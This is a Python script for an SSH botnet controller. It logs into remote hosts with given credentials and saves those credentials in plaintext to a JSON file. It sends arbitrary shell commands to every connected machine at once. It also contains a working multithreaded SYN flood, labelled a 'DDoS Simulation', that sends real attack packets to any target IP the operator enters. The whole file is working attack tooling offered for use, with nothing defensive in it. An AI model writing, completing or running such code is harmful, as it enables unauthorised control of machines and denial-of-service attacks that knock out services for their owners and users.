import os
import json
import threading
from colorama import Fore, Style
from pexpect import pxssh
from scapy.all import IP, TCP, send

botnet = []  
bot_data = []  
connected_hosts = set()

# ------------------------ SSH Functions ------------------------

def connect_ssh(host, user, password, port=22, save=True):
    if host in connected_hosts:
        print(Fore.YELLOW + f"[!] Already connected to {host}, skipping..." + Style.RESET_ALL)
        return

    try:
        s = pxssh.pxssh()
        s.login(host, user, password, port=port)
        print(Fore.GREEN + f"[+] Connected to {host}" + Style.RESET_ALL)
        botnet.append(s)
        connected_hosts.add(host)
        if save:
            bot_data.append({"host": host, "user": user, "password": password, "port": port}) 
    except Exception as e:
        print(Fore.RED + f"[-] Failed to connect to {host}: {e}" + Style.RESET_ALL)


def send_command(session, cmd):
    session.sendline(cmd)
    session.prompt()
    return session.before.decode().split("\n", 1)[1]  

# ------------------------ Botnet Management ------------------------

def list_bots():
    if not botnet:
        print(Fore.RED + "[-] No bots connected." + Style.RESET_ALL)
        return

    print(Fore.BLUE + "\n--- Connected Bots ---" + Style.RESET_ALL)
    for i, (bot, session) in enumerate(zip(bot_data, botnet), start=1):
        host = bot.get("host")
        user = bot.get("user")
        port = bot.get("port", 22)
        session_id = id(session)  

        print(f"[{i}] Host: {host} | User: {user} | Port: {port} | Session ID: {session_id}")


def botnet_command(command):
    for i, session in enumerate(botnet):
        print(Fore.CYAN + f"\n[Bot {i+1}] Output:" + Style.RESET_ALL)
        try:
            output = send_command(session, command)
            print(output)
        except Exception as e:
            print(Fore.RED + f"[-] Failed to execute on Bot {i+1}: {e}" + Style.RESET_ALL)

def add_client():
    host = input("Enter Host/IP: ")
    user = input("Enter Username: ")
    password = input("Enter Password: ")
    port = input("Enter SSH Port (default 22): ") or "22"
    connect_ssh(host, user, password, int(port))

def bash():
    print(Fore.YELLOW + "\nEntering interactive bash mode. Type 'exit' to leave." + Style.RESET_ALL)
    while True:
        command = input("bash> ")
        if command.lower() == "exit":
            break
        botnet_command(command)

# ------------------------ Persistence ------------------------

def save_botnet():
    with open("botnet.json", "w") as f:
        json.dump(bot_data, f)
    print(Fore.GREEN + "[+] Botnet saved to botnet.json" + Style.RESET_ALL)

def load_botnet():
    if os.path.exists("botnet.json"):
        with open("botnet.json", "r") as f:
            bots = json.load(f)
            for bot in bots:
                connect_ssh(bot["host"], bot["user"], bot["password"], bot.get("port", 22), save=False)

# ------------------------ DDoS Simulation ------------------------

def syn_flood(target_ip, target_port):
    print(Fore.MAGENTA + f"[!] Launching SYN Flood on {target_ip}:{target_port}..." + Style.RESET_ALL)
    def flood():
        while True:
            ip = IP(dst=target_ip)
            tcp = TCP(sport=os.getpid() % 65535, dport=target_port, flags="S")
            pkt = ip / tcp
            send(pkt, verbose=0)
    
    for _ in range(100):  # 100 threads
        threading.Thread(target=flood, daemon=True).start()

# ------------------------ Interface ------------------------

def display_menu():
    print(Fore.CYAN + "\n--- SSH Botnet Menu ---" + Style.RESET_ALL)
    print("1. List Bots")
    print("2. Add Bot")
    print("3. Run Command on All Bots")
    print("4. Interactive Bash")
    print("5. SYN Flood (DDoS Simulation)")
    print("6. Save Botnet")
    print("7. Exit")

def ask_for_command():
    return input("Command to execute: ")

# ------------------------ Main ------------------------

def main():
    load_botnet()
    while True:
        display_menu()
        choice = input("Select Option: ")
        if choice == "1":
            list_bots()
        elif choice == "2":
            add_client()
        elif choice == "3":
            cmd = ask_for_command()
            botnet_command(cmd)
        elif choice == "4":
            bash()
        elif choice == "5":
            ip = input("Target IP: ")
            port = int(input("Target Port: "))
            syn_flood(ip, port)
        elif choice == "6":
            save_botnet()
        elif choice == "7":
            print(Fore.YELLOW + "[!] Exiting. Closing sessions..." + Style.RESET_ALL)
            for bot in botnet:
                bot.logout()
            break
        else:
            print(Fore.RED + "Invalid choice. Try again." + Style.RESET_ALL)

if __name__ == "__main__":
    main()
